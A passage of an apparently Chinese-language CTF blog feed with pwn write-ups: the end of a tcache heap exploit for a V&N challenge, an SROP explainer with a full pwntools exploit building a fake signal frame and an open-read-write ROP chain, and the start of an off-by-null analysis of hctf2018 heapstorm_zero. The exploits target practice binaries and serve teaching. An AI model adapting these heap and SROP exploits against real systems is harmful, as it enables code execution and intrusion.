class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off-by-null</title>
    <link href="https://nocbtm.github.io/2020/02/28/off-by-null/"/>
    <id>https://nocbtm.github.io/2020/02/28/off-by-null/</id>
    <published>2020-02-28T08:47:12.000Z</published>
    <updated>2020-04-07T03:40:06.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。</p><p>题目链接 <a href="https://github.com/veritas501/hctf2018" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018</a></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>直接拿源码分析，程序是一个比较简单的菜单程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">init();</span><br><span class="line">while(1)&#123;</span><br><span class="line">switch(menu_getinput())&#123;</span><br><span class="line">case 1:&#123;</span><br><span class="line">Allocate();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 2:&#123;</span><br><span class="line">View();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 3:&#123;</span><br><span class="line">Delete();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 4:&#123;</span><br><span class="line">puts(&quot;Bye!&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">default:&#123;</span><br><span class="line">puts(&quot;Invaild choice!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看看 init 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> * pageaddr;</span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;pageaddr,<span class="keyword">sizeof</span>(<span class="keyword">void</span> *)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pageaddr = (<span class="keyword">void</span> *)(((<span class="keyword">size_t</span>)(pageaddr)&amp;~<span class="number">0xfff</span>)%<span class="number">0x133700000000</span>);</span><br><span class="line"><span class="comment">// 随机mmap 一块内存，存放程序分配的内存指针</span></span><br><span class="line">page = mmap(pageaddr,<span class="number">0x1000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(page != pageaddr)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mmap error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 随机生成秘钥，用于加密指针</span></span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;(page-&gt;xorkey),<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">page-&gt;chunk[i]=(<span class="keyword">char</span> *)page-&gt;xorkey;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。</p><h3 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(sum &gt; <span class="number">0x20</span>u)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span 